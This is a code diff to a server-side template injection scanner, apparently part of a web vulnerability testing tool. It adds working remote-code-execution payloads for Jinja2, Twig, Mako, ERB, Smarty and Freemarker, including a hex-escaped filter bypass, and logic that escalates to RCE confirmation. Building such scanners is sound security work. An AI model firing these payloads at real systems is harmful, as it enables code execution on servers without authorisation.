@@ -1943,6 +1943,8 @@ class SSTIEngine(BaseEngine):
         'ERB': ['<%=', 'erb', 'rails'],
         'ASP': ['<%=', 'asp', 'aspx'],
         'Jade': ['#{', 'jade', 'pug'],
+        'Mako': ['<%', 'mako', 'template'],
+        'Pebble': ['pebble', '{{'],
     }
 
     L1_PAYLOADS = [
@@ -1955,6 +1957,7 @@ class SSTIEngine(BaseEngine):
         ("{$smarty.now}", "\\d+", "Smarty时间戳"),
         ("{7*7}", "49", "Smarty算术"),
         ("@(7*7)", "49", "Velocity算术"),
+        ('${"7"*7}', "7777777", "Mako字符串乘法"),
     ]
 
     L2_PAYLOADS = [
@@ -1972,11 +1975,26 @@ class SSTIEngine(BaseEngine):
     ]
 
     L3_PAYLOADS = [
+        # --- Jinja2 / Flask / Django (Python) ---
         ("{{ cycler.__init__.__globals__.os.popen('id').read() }}", "uid=", "Jinja2 RCE(cycler)"),
         ("{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}", "uid=", "Jinja2 RCE(config)"),
         ("{{ ''.__class__.__mro__[1].__subclasses__() }}", "subprocess", "Jinja2 RCE(subclasses)"),
         ("{{ request.application.__self__._get_data_for_json.__globals__['json'].loads }}", "json", "Flask RCE"),
         ("{{ url_for.__globals__.os.popen('id').read() }}", "uid=", "Flask url_for RCE"),
+        # 沙箱/黑名单多态绕过：属性名 hex 转义绕过 __globals__ 词过滤（A3 多态变形）
+        ("{{ request|attr('application')|attr('\x5f\x5fglobal\x5f\x5f')|attr('os')|attr('popen')('id')|attr('read')() }}", "uid=", "Jinja2 RCE(hex-attr bypass)"),
+        ("{{ lipsum.__globals__['os'].popen('id').read() }}", "uid=", "Jinja2 RCE(lipsum)"),
+        # --- Twig (PHP / Symfony) ---
+        ("{{ ['id']|filter('system') }}", "uid=", "Twig RCE(filter system)"),
+        ("{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}", "uid=", "Twig RCE(registerUndefinedFilterCallback)"),
+        # --- Mako (Python) ---
+        ("${__import__('os').popen('id').read()}", "uid=", "Mako RCE"),
+        ("<% import os; print(os.popen('id').read()) %>", "uid=", "Mako RCE(code-block)"),
+        # --- ERB / Ruby ---
+        ("<%= `id` %>", "uid=", "ERB/Ruby RCE"),
+        # --- Smarty (PHP) ---
+        ("{php}system('id');{/php}", "uid=", "Smarty RCE(php tag)"),
+        # --- Freemarker (Java) ---
         ("${" + '"'.join(["new", "java.lang.ProcessBuilder('id').start()"]) + "}", "ProcessBuilder", "Freemarker RCE"),
         ("${" + '"'.join(["new", "java.lang.Runtime.getRuntime().exec('id')"]) + "}", "Runtime", "Freemarker RCE"),
     ]
@@ -2007,24 +2025,31 @@ class SSTIEngine(BaseEngine):
         )
         if l1_result:
             l1_result['stage'] = 'L1'
-            return l1_result
 
         l2_result = await self._check_l2(
             url, param, normal_resp, parsed_query, session, compliant
         )
         if l2_result:
             l2_result['stage'] = 'L2'
-            return l2_result
 
-        if detected_engines:
+        # RCE 升级：仅当 L1/L2 已确认注入 或 正常响应已暴露引擎签名时，才尝试 RCE 实锤，
+        # 避免对任意参数盲打 RCE payload（A3：SSTI RCE 实锤与严重度升级）。
+        injection_suspected = bool(l1_result or l2_result or detected_engines)
+        if injection_suspected:
             l3_result = await self._check_l3(
                 url, param, normal_resp, parsed_query, session, compliant
             )
             if l3_result:
                 l3_result['stage'] = 'L3'
                 l3_result['rce_confirmed'] = True
+                l3_result['ai_verdict'] = '高'
+                l3_result['confidence'] = 'high'
                 return l3_result
 
+        if l1_result:
+            return l1_result
+        if l2_result:
+            return l2_result
         return None
 
     async def _check_l1(
